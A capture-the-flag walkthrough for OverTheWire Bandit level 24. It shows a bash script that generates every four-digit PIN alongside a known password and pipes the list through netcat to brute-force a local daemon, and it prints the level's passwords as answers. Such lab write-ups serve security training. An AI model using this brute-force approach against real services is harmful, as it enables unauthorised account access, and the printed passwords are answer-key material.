# Level 24

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Solution

```console
ssh bandit24@bandit.labs.overthewire.org -p 2220
bandit24@bandit:~$ mkdir /tmp/dir
bandit24@bandit:~$ cd /tmp/dir
bandit24@bandit:/tmp/dir$ nano script.sh
```

I then needed to create a dictionary. This dictionary would have the current password + a 4 digit code. Since we do not know the 4 digit code, we need to print all possible variations.

```console

#!/bin/bash
passwd="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

for a in {0..9}
do
        for b in {0..9}
        do
                for c in {0..9}
                do
                        for d in {0..9}
                        do
                                echo $passwd $a$b$c$d >> dictionary.txt
                        done
                done
        done
done

```

Then I will need to run the script:

```console
bandit24@bandit:/tmp/dir$ chmod 777 script.sh
bandit24@bandit:/tmp/dir$ ./script.sh
bandit24@bandit:/tmp/dir$ cat dictionary.txt
```

Returns a large file with all possible combinations:
```console
...
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9957
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9958
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9959
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9960
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9961
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9962
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9963
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9964
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9965
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9966
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9967
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9968
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9969
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9970
...
```

We then need to use netcat on port `30002` and pipe in the `dictionary.txt`:

```console
bandit24@bandit:/tmp/dir$ cat dictionary.txt | nc localhost 30002 >> password.txt
```

Seeing as our password file will have many incorrect entries, we should sort it.

```console
bandit24@bandit:/tmp/pppp$ sort -u password.txt

Correct!
Exiting.
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
Wrong! Please enter the correct pincode. Try again.
```
